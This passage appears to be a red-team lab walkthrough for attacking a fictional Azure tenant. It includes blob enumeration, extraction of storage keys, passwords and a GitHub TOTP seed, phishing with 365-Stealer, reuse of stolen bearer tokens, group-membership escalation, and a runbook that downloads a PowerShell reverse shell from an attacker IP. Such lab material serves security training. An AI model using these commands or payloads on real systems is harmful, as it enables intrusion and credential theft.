seJSiX51PWZ7AoxC6m4brLDmuuVxe4Oc8RB_NIQABFnUqbNFk3SQmZCOc04W5KNyxzO4vgD9fs-65C8QXwWm5oERo4e-zWRQIdAfqQol7YSgqSH9cNIIG8Ot-AeHg6Y2IiQ8v9Xk2FXTseVzk78BztoQd0LeqVt9N9AvkVUk69C2bQ355zEbu5eKU9kO04cQ9sBUZIdscHMcMmtKGzVb1Pul4b-QvnVcxlyEaLcW0-ANIkMsXx5mH_X1r3UJtvqJ_Fqeil5TUCja94tUCYbUJAxNER4FfcBWvJ5xbjvYouPpFiyzXi8nN_EUV5i82DxkcBKG_2tQXCgpMSNtfVw'; . C:\AzAD\Tools\Add-AzADAppSecret.ps1; Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

![picture 55](images/05c2aa658f8845e5e58e917459a599077bcb57c8e44e1545f642d1e050b544bc.png)  

- As shown, we can add secret to the enterprise app `fileapp`:

```
Object ID : 35589758-714e-43a9-be9e-94d22fdd34f6
App ID    : f072c4a6-b440-40de-983f-a7f3bd317d8f
App Name  : fileapp
Key ID    : fb35c2e5-ae96-4473-a69b-d9f1ca5386a3
Secret    : 6n~_sxZ8~.nmU~p-4.USSQ2fscApxR9r46
```

<br/>

---

## Objective 13:  App Service Abuse - Storage Blobs

**Questions**

1. Find out insecure storage blobs in the defcorphq tenant.
2. Look for interesting information or secrets in the blob that allow you to access another storage account.
3. Extract secrets from the second storage account.

<br/>

**Answer**

First use **MicroBurst** to enumeate storage accounts in the defcorphq tenant.

```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1; Invoke-EnumerateAzureBlobs -Base defcorp
```

![picture 59](images/09ed02be7d5f23c72f0395700e45d0f9214400aff2f98c994da92780ebfb4ebe.png)  

Storage Accounts found:

- defcorpcodebackup.blob.core.windows.net
- defcorpcommon.blob.core.windows.net

Container found:
- defcorpcommon.blob.core.windows.net/backup
  - Empty Public Container Available: https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list

<br/>

Check the container found on https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list:

![picture 60](images/ca3b5f42a7fcaffe646df36ffc14ba3a15760c6180f8432c6a264f9ed8fa4288.png)  

- There is a python script called `blob_client.py`

<br/>

Browsing https://defcorpcommon.blob.core.windows.net/backup/blob_client.py, the source code of the python script is found:

Note:
May have to use `CTRL+F5` in order to see the code

![picture 61](images/dd3536d69d34c0cd65b3c636a57e7c672d886b530787ba3fe7af36976ef80a36.png)  


```
from datetime import datetime, timedelta
from azure.storage.blob import generate_container_sas, ContainerSasPermissions

account_name = "defcorpcommon"
account_key = "SoJShFmp0iWjkIa985+lejwcG05vYnIeEROpP7eC8T0="
container_name = "backup"

# using generate_container_sas
def get_img_url_with_container_sas_token(blob_name):
    container_sas_token = generate_container_sas(
        account_name=account_name,
        container_name=container_name,
        account_key=account_key,
        permission=ContainerSasPermissions(read=True),
        expiry=datetime.utcnow() + timedelta(hours=1)
    )
	# URL: https://defcorpcodebackup.blob.core.windows.net/client?sp=rl&st=2021-03-16T04:46:44Z&se=2022-03-16T12:46:44Z&sv=2020-02-10&sr=c&sig=SoJShFmp0iWjkIa985%2BlejwcG05vYnIeEROpP7eC8T0%3D
    blob_url_with_container_sas_token = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}?{container_sas_token}"
    return blob_url_with_container_sas_token

from azure.storage.blob import generate_blob_sas, BlobSasPermissions

# using generate_blob_sas
def get_img_url_with_blob_sas_token(blob_name):
    blob_sas_token = generate_blob_sas(
        account_name=account_name,
        container_name=container_name,
        blob_name=blob_name,
        account_key=account_key,
        permission=ContainerSasPermissions(read=True),
        expiry=datetime.utcnow() + timedelta(hours=1)
    )
    blob_url_with_blob_sas_token = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}?{blob_sas_token}"
    return blob_url_with_blob_sas_token

from flask import Flask, render_template

app = Flask(__name__)

@app.route("/showimg")
@app.route("/showimg/<blob_name>")
def hello_world(blob_name=None):
    img_url_with_sas_token = get_img_url_with_blob_sas_token(blob_name)
    # Or 
    # img_url_with_sas_token = get_img_url_with_container_sas_token(blob_name)
    return render_template('showimage.html', img_url_with_sas_token=img_url_with_sas_token)

app.run()
```

The comment line shows a SAS URL:
- https://defcorpcodebackup.blob.core.windows.net/client?sp=rl&st=2021-03-16T04:46:44Z&se=2022-03-16T12:46:44Z&sv=2020-02-10&sr=c&sig=SoJShFmp0iWjkIa985%2BlejwcG05vYnIeEROpP7eC8T0%3D

We can further use **Azure Storage Explorer** to check.

<br/>

![picture 62](images/5b9c3c9d9ef3fb49a9cc27b52f7658d2cbff03ce765b2c7e4531285dc9808c0d.png)  

![picture 63](images/06d434a4dd884f3a661941450239c7f2b798547b4191a84d19aa28841aaa1b2d.png)  

![picture 64](images/c8ac51a0d4943bb0f1e981b567907f78a656f3c3edc1b2b8e92cb61836c6ff87.png)  

<br/>

In the blob, we can see two files:
- app.zip
- authenticator.txt


![picture 65](images/31d3062b80638999c1c4a4df141772d1ac66376e754d7ccec88979776d5b6f25.png)  

<br/>

Download both files and check. Here are the interesting info found:

1. Github 2FA Secret (From `authenticator.txt`)
- otpauth://totp/GitHub:laurenazad?secret=ZIG7QB6EUEN6M4K5&issuer=GitHub

2. Github secret in `app/Dockerfile`

```
FROM python:3.9
ENV GIT_USERNAME="jenniferazad"
ENV GIT_PASSWORD="j3n!F3juF!_b@p9!"
ENV GIT_USERNAME_1="laurenazad"
ENV GIT_PASSWORD_1="j@(k@y9&yTWQQ_="
WORKDIR /AzureFunAppPrivate/
RUN git clone https://github.com/DefCorp/SimpleApps.git
RUN apt-get update
RUN pip install -r /AzureFunAppPrivate/requirements.txt
CMD [ "python", "run.py" ]
```

<br/>

---

## Objective 14: Automation account

**Questions**

1. Use access token for a user from the reverse shell that we have on defeng-consent (Objective 9) to find another user or group that has interesting permissions on an automation account in the defcorphq tenant.

2. Abuse the permissions on the automation account to execute a cloud to on-prem lateral movement and get command execution on a hybrid worker.

<br/>

**Answer**

To get the reverse shell back:

1. Run XAMPP as admin and start Apache
2. Make sure `Invoke-PowerShellTcp.ps1` is at `C:\xampp\htdocs\`
3. `C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444`
4. Run 365-Stealer to hold the phishing site: `cd C:\xampp\htdocs\365-Stealer; &"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app`
5. Send phishing email to` markdwalden@defcorphq.onmicrosoft.com`
6. Upload the malicious document: `cd C:\xampp\htdocs\365-Stealer\; &'C:\Program Files\Python38\python.exe' C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\student190.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt`

![picture 66](images/aa93f08dd67ba454c99135da32aaeaec724d1291fccd5cf396ffc9c0ab176489.png)  

<br/>

To show the logged in Azure user via az cli:

```
az ad signed-in-user show | Select-String userPrincipalName
```

![picture 67](images/88c7f1eb5b51ea37adf31204557059bd5c5429c507bea380986b601821f978a8.png)  

<br/>

To find automation account:

```
az extension add --upgrade -n automation; az automation account list
```

![picture 68](images/f130cb3900c229065aad4205fa9570f0995fd83e2584249c93248fbe0ad9fed0.png)  

- Found automation account:  `HybridAutomation` (Resource group: `Engineering`)

<br/>

To find the objects owned by the current user Mark:

```
az ad signed-in-user list-owned-objects
```

![picture 69](images/be3241437e98c6e04e9577a8eba070fae17da2911739b1d8a5905dcb81c5b4a6.png)  

- Mark owns the ad member group `Automation Admins` who is able to run and create runbooks

<br/>

To be able to interact with Azure AD, request a token for the aad-graph. We can use that token with the Azure AD module. Run the below command:

```
az account get-access-token --resource-type aad-graph
```

![picture 70](images/169d0502838e5d48ea7f602d1ea587f17d7b74ffaad27b2a26130aa0c5e4c1e0.png)  

- The Bearer token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5Njk0MzQsIm5iZiI6MTYxOTk2OTQzNCwiZXhwIjoxNjE5OTczMzM0LCJhY3IiOiIxIiwiYWlvIjoiQVNRQTIvOFRBQUFBQk5QVko4aWYyZms3aDh5bzdYS0J1ZWt5eks1OS9haHJLNzFDQUVWSzVOWT0iLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMDRiMDc3OTUtOGRkYi00NjFhLWJiZWUtMDJmOWUxYmY3YjQ2IiwiYXBwaWRhY3IiOiIwIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6Ik1hcmsgRC4gV2FsZGVuIiwib2lkIjoiZjY2ZTEzM2MtYmQwMS00YjBiLWIzYjctN2NkOTQ5ZmQ0NWYzIiwicHVpZCI6IjEwMDMyMDAxMjBENENFNEIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHBWM3NBVGJqUnBHdS00Qy1lR19lMFp3QUNjLiIsInNjcCI6IjYyZTkwMzk0LTY5ZjUtNDIzNy05MTkwLTAxMjE3NzE0NWUxMCIsInN1YiI6IlpqMVAtM2NOZmMzV3d6SXU0UUtZQVVYc2Z1ZjNyQkxJZ2o4X0hCV3hLcm8iLCJ0ZW5hbnRfcmVnaW9uX3Njb3BlIjoiQVMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1bmlxdWVfbmFtZSI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXRpIjoiOFJ1b281N3pORVNXb2Fzd3g2V3VBZyIsInZlciI6IjEuMCJ9.S8WkbdiM6aw3CKQueGriNOoJa_qQe44NFN1jxB8fviLgWflm1eWaIqzhZsx7jkcHmXui9DTktlwurYjvc9V_3mN8lIa6eOI4H46HeCkCu4Q3jRjglzEv3etKjzN1QPwUWPtinPbFM6Yu5uYoe1gEPAzQQYQWMjEKXDFXTg8vKEBHX_nAumiO32DQuyiHiv27m0nPObr_i88t8ThQHHioncYx65F3dga3jcqiQR-CCMgg_NhmBwwbi85PLlC5jTbkpee4-4TbYd482cVOdrI6Yd-eNLHYzYhY-lr6aukA3_sFuwFSYSt_HGx9ZuYFoGpuf-FKXX_PS2GSCmwb1Y3h0Q
```

- subscription: `b413826f-108d-4049-8c11-d52d5d388768`
- tenant: `2d50cb29-5f7b-48a4-87ce-fe75a941adb6`

<br/>

Then we can use the token on the attacker machine:

```
Get-AzureADCurrentSessionInfo; Get-AzureADTenantDetail
```

![picture 71](images/54e8646d5064968f0aeee3a4203ff3914c5efe46c53256a1ba77bd38a93ece30.png)  

<br/>

Since Mark has a privilege of `Automation Admins`, we can try to add Mark as a member of the `Automation Admins`.

- Obtaining Mark's Azure Account ID:  `az ad signed-in-user show | Select-String objectId`
  - `f66e133c-bd01-4b0b-b3b7-7cd949fd45f3`

- Obtaining the `Automation Admins` ID:  `az ad group show --group "Automation Admins"`
  - `e6870783-1378-4078-b242-84c08c6dc0d7`

<br/>

To add Mark as a member of `Automation Admins`:

```
Add-AzureADGroupMember -ObjectId "e6870783-1378-4078-b242-84c08c6dc0d7" -RefObjectId "f66e133c-bd01-4b0b-b3b7-7cd949fd45f3" -Verbose
```

![picture 72](images/030cad1e2e1ec5597d1e2d515173e10a21a64f9f975d18c77465eb3938ff9aad.png)  

<br/>

To get the information of the automation account, in the reverse shell:

```
az automation account list
```

- Result:

```
[
  {
    "creationTime": "2021-03-17T14:40:05.340000+00:00",
    "description": null,
    "etag": null,
    "id": "/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation",
    "lastModifiedBy": null,
    "lastModifiedTime": "2021-04-04T03:50:44.573333+00:00",
    "location": "switzerlandnorth",
    "name": "HybridAutomation",
    "resourceGroup": "Engineering",
    "sku": null,
    "state": null,
    "tags": {},
    "type": "Microsoft.Automation/AutomationAccounts"
  }
]
```

<br/>

To get Mark's access token, in the reverse shell:

```
az account get-access-token
```

![picture 73](images/3bf8c050b50a67b69666c5dfc227798d76ac7b51aa53db480f82633d71e71188.png)  


- The Bearer token:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNjE5OTY4NTMzLCJuYmYiOjE2MTk5Njg1MzMsImV4cCI6MTYxOTk3MjQzMywiYWNyIjoiMSIsImFpbyI6IkFTUUEyLzhUQUFBQTdFb0dOby9pekNlbSs3SlpEOGkreGdIYnhocXBkMGRvaCtYaE1GNFM0d0k9IiwiYW1yIjpbInB3ZCJdLCJhcHBpZCI6IjA0YjA3Nzk1LThkZGItNDYxYS1iYmVlLTAyZjllMWJmN2I0NiIsImFwcGlkYWNyIjoiMCIsImdyb3VwcyI6WyIwY2U3ZDQzMi05NGVhLTQ0OGMtYTE0OS00YTU2Mzk2MzU2YmIiLCJlNjg3MDc4My0xMzc4LTQwNzgtYjI0Mi04NGMwOGM2ZGMwZDciXSwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6Ik1hcmsgRC4gV2FsZGVuIiwib2lkIjoiZjY2ZTEzM2MtYmQwMS00YjBiLWIzYjctN2NkOTQ5ZmQ0NWYzIiwicHVpZCI6IjEwMDMyMDAxMjBENENFNEIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHBWM3NBVGJqUnBHdS00Qy1lR19lMFp3QUNjLiIsInNjcCI6InVzZXJfaW1wZXJzb25hdGlvbiIsInN1YiI6ImFqV2FQY0tCTFF2aE5NWDFkTHBLR3ZfeXFHUzRxekNGQXptUEJjZXVaelUiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1bmlxdWVfbmFtZSI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXRpIjoiTWRBemRHSGNiRVdKeHYyd2lobnJBUSIsInZlciI6IjEuMCIsIndpZHMiOlsiOWI4OTVkOTItMmNkMy00NGM3LTlkMDItYTZhYzJkNWVhNWMzIiwiYjc5ZmJmNGQtM2VmOS00Njg5LTgxNDMtNzZiMTk0ZTg1NTA5Il0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.QcHonzniZBpnOdo_69MU5lORMyABWtNhrEZTfEkgyvFvZQQMRalf-mq3IVnVQKslbnvM7W1DUrPHOu0RLzNOpxeLgoi8wAsww_UCHTOFZ29m6hdWPJXsF-G_MUYI2y5R7xhzJYX7gUjPqAEAEaZyP7X7vhMSQBncw6_qny52aw8Iu4WwfCy4pXk25qfAmD_sgozE662tFc-hSWGrcI-VS4uBg_n2H3rh_04eBFMjy-cWopU9zdp_8UvuNGyIe93d82pWpvzEUVv2bjOXuBOohzMrpM4KAglla7WKrNMKoVbY9vIAWxBo_-Iy2bKwuAFjbsnk9aF8Pi1tJzjge0V_6A
```

<br/>

Then we can use the access token locally using Az PowerShell:

```
$AADToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5Njk0MzQsIm5iZiI6MTYxOTk2OTQzNCwiZXhwIjoxNjE5OTczMzM0LCJhY3IiOiIxIiwiYWlvIjoiQVNRQTIvOFRBQUFBQk5QVko4aWYyZms3aDh5bzdYS0J1ZWt5eks1OS9haHJLNzFDQUVWSzVOWT0iLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMDRiMDc3OTUtOGRkYi00NjFhLWJiZWUtMDJmOWUxYmY3YjQ2IiwiYXBwaWRhY3IiOiIwIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6Ik1hcmsgRC4gV2FsZGVuIiwib2lkIjoiZjY2ZTEzM2MtYmQwMS00YjBiLWIzYjctN2NkOTQ5ZmQ0NWYzIiwicHVpZCI6IjEwMDMyMDAxMjBENENFNEIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHBWM3NBVGJqUnBHdS00Qy1lR19lMFp3QUNjLiIsInNjcCI6IjYyZTkwMzk0LTY5ZjUtNDIzNy05MTkwLTAxMjE3NzE0NWUxMCIsInN1YiI6IlpqMVAtM2NOZmMzV3d6SXU0UUtZQVVYc2Z1ZjNyQkxJZ2o4X0hCV3hLcm8iLCJ0ZW5hbnRfcmVnaW9uX3Njb3BlIjoiQVMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1bmlxdWVfbmFtZSI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXRpIjoiOFJ1b281N3pORVNXb2Fzd3g2V3VBZyIsInZlciI6IjEuMCJ9.S8WkbdiM6aw3CKQueGriNOoJa_qQe44NFN1jxB8fviLgWflm1eWaIqzhZsx7jkcHmXui9DTktlwurYjvc9V_3mN8lIa6eOI4H46HeCkCu4Q3jRjglzEv3etKjzN1QPwUWPtinPbFM6Yu5uYoe1gEPAzQQYQWMjEKXDFXTg8vKEBHX_nAumiO32DQuyiHiv27m0nPObr_i88t8ThQHHioncYx65F3dga3jcqiQR-CCMgg_NhmBwwbi85PLlC5jTbkpee4-4TbYd482cVOdrI6Yd-eNLHYzYhY-lr6aukA3_sFuwFSYSt_HGx9ZuYFoGpuf-FKXX_PS2GSCmwb1Y3h0Q'; $AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNjE5OTY4NTMzLCJuYmYiOjE2MTk5Njg1MzMsImV4cCI6MTYxOTk3MjQzMywiYWNyIjoiMSIsImFpbyI6IkFTUUEyLzhUQUFBQTdFb0dOby9pekNlbSs3SlpEOGkreGdIYnhocXBkMGRvaCtYaE1GNFM0d0k9IiwiYW1yIjpbInB3ZCJdLCJhcHBpZCI6IjA0YjA3Nzk1LThkZGItNDYxYS1iYmVlLTAyZjllMWJmN2I0NiIsImFwcGlkYWNyIjoiMCIsImdyb3VwcyI6WyIwY2U3ZDQzMi05NGVhLTQ0OGMtYTE0OS00YTU2Mzk2MzU2YmIiLCJlNjg3MDc4My0xMzc4LTQwNzgtYjI0Mi04NGMwOGM2ZGMwZDciXSwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6Ik1hcmsgRC4gV2FsZGVuIiwib2lkIjoiZjY2ZTEzM2MtYmQwMS00YjBiLWIzYjctN2NkOTQ5ZmQ0NWYzIiwicHVpZCI6IjEwMDMyMDAxMjBENENFNEIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHBWM3NBVGJqUnBHdS00Qy1lR19lMFp3QUNjLiIsInNjcCI6InVzZXJfaW1wZXJzb25hdGlvbiIsInN1YiI6ImFqV2FQY0tCTFF2aE5NWDFkTHBLR3ZfeXFHUzRxekNGQXptUEJjZXVaelUiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1bmlxdWVfbmFtZSI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXRpIjoiTWRBemRHSGNiRVdKeHYyd2lobnJBUSIsInZlciI6IjEuMCIsIndpZHMiOlsiOWI4OTVkOTItMmNkMy00NGM3LTlkMDItYTZhYzJkNWVhNWMzIiwiYjc5ZmJmNGQtM2VmOS00Njg5LTgxNDMtNzZiMTk0ZTg1NTA5Il0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.QcHonzniZBpnOdo_69MU5lORMyABWtNhrEZTfEkgyvFvZQQMRalf-mq3IVnVQKslbnvM7W1DUrPHOu0RLzNOpxeLgoi8wAsww_UCHTOFZ29m6hdWPJXsF-G_MUYI2y5R7xhzJYX7gUjPqAEAEaZyP7X7vhMSQBncw6_qny52aw8Iu4WwfCy4pXk25qfAmD_sgozE662tFc-hSWGrcI-VS4uBg_n2H3rh_04eBFMjy-cWopU9zdp_8UvuNGyIe93d82pWpvzEUVv2bjOXuBOohzMrpM4KAglla7WKrNMKoVbY9vIAWxBo_-Iy2bKwuAFjbsnk9aF8Pi1tJzjge0V_6A'; Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId b413826f-108d-4049-8c11-d52d5d388768
```

![picture 74](images/423fc400a14ff01b7712aff85b6cfae6b764ec1aba82b7ba341ca1fe2078dad9.png)  

<br/>

To get the role of Mark on the automation account:

```
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
```

![picture 75](images/7d7f0bbe9575e9470e1fa8f683870d913357c34115d7cbabfffc4a451fb8f252.png)  

- This shows Mark has the `Contributor` role
  - Role ID:  `e6870783-1378-4078-b242-84c08c6dc0d7`
  - Role Definition (Contributor) ID: `b24988ac-6180-42a0-ab88-20f7382dd24c`

<br/>

Since Mark has the Contributor role on the automation account, we can create and run Runbooks. To check if a hybrid worker group is in use by the automation account:

```
Get-AzAutomationHybridWorkerGroup -ResourceGroupName Engineering -AutomationAccountName HybridAutomation
```

![picture 76](images/ceab7c364693d217f11f089b67273d574a2c332628009f5c8d516e9489633283.png)  

- Hybrid Work Group is in used so we can run commands / scripts on the on-perm infrastructure.
  - Name: `Workergroup1`
  - Runbook Worker:  `defeng-adcsrv.defeng.corp`

<br/>

Prepare a script (`student190.ps1`) which returns us a reverse shell:

```
IEX (New-Object Net.Webclient).downloadstring("http://172.16.152.190:82/Invoke-PowerShellTcp.ps1")

reverse -Reverse -IPAddress 172.16.152.190 -Port 4444
```

Also run a netcat listener:

```
C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444
```

<br/>

Then import an automation runbook:

```
$AADToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk5Njk0MzQsIm5iZiI6MTYxOTk2OTQzNCwiZXhwIjoxNjE5OTczMzM0LCJhY3IiOiIxIiwiYWlvIjoiQVNRQTIvOFRBQUFBQk5QVko4aWYyZms3aDh5bzdYS0J1ZWt5eks1OS9haHJLNzFDQUVWSzVOWT0iLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMDRiMDc3OTUtOGRkYi00NjFhLWJiZWUtMDJmOWUxYmY3YjQ2IiwiYXBwaWRhY3IiOiIwIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6Ik1hcmsgRC4gV2FsZGVuIiwib2lkIjoiZjY2ZTEzM2MtYmQwMS00YjBiLWIzYjctN2NkOTQ5ZmQ0NWYzIiwicHVpZCI6IjEwMDMyMDAxMjBENENFNEIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHBWM3NBVGJqUnBHdS00Qy1lR19lMFp3QUNjLiIsInNjcCI6IjYyZTkwMzk0LTY5ZjUtNDIzNy05MTkwLTAxMjE3NzE0NWUxMCIsInN1YiI6IlpqMVAtM2NOZmMzV3d6SXU0UUtZQVVYc2Z1ZjNyQkxJZ2o4X0hCV3hLcm8iLCJ0ZW5hbnRfcmVnaW9uX3Njb3BlIjoiQVMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1bmlxdWVfbmFtZSI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXRpIjoiOFJ1b281N3pORVNXb2Fzd3g2V3VBZyIsInZlciI6IjEuMCJ9.S8WkbdiM6aw3CKQueGriNOoJa_qQe44NFN1jxB8fviLgWflm1eWaIqzhZsx7jkcHmXui9DTktlwurYjvc9V_3mN8lIa6eOI4H46HeCkCu4Q3jRjglzEv3etKjzN1QPwUWPtinPbFM6Yu5uYoe1gEPAzQQYQWMjEKXDFXTg8vKEBHX_nAumiO32DQuyiHiv27m0nPObr_i88t8ThQHHioncYx65F3dga3jcqiQR-CCMgg_NhmBwwbi85PLlC5jTbkpee4-4TbYd482cVOdrI6Yd-eNLHYzYhY-lr6aukA3_sFuwFSYSt_HGx9ZuYFoGpuf-FKXX_PS2GSCmwb1Y3h0Q'; $AccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNjE5OTcyMTMzLCJuYmYiOjE2MTk5NzIxMzMsImV4cCI6MTYxOTk3NjAzMywiYWNyIjoiMSIsImFpbyI6IkUyWmdZSmdZYVhxeS9XTGh5NVIxY3VrWmo0eGw1NGEyUjdBZWtzMFYxSmkwNE5HT0w1TUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMDRiMDc3OTUtOGRkYi00NjFhLWJiZWUtMDJmOWUxYmY3YjQ2IiwiYXBwaWRhY3IiOiIwIiwiZ3JvdXBzIjpbIjBjZTdkNDMyLTk0ZWEtNDQ4Yy1hMTQ5LTRhNTYzOTYzNTZiYiIsImU2ODcwNzgzLTEzNzgtNDA3OC1iMjQyLTg0YzA4YzZkYzBkNyJdLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiTWFyayBELiBXYWxkZW4iLCJvaWQiOiJmNjZlMTMzYy1iZDAxLTRiMGItYjNiNy03Y2Q5NDlmZDQ1ZjMiLCJwdWlkIjoiMTAwMzIwMDEyMEQ0Q0U0QiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0cFYzc0FUYmpScEd1LTRDLWVHX2UwWndBQ2MuIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoiYWpXYVBjS0JMUXZoTk1YMWRMcEtHdl95cUdTNHF6Q0ZBem1QQmNldVp6VSIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiTWFya0RXYWxkZW5AZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJVdFJtUjV1V1lrT2tRNzhVUHZLdUFnIiwidmVyIjoiMS4wIiwid2lkcyI6WyI5Yjg5NWQ5Mi0y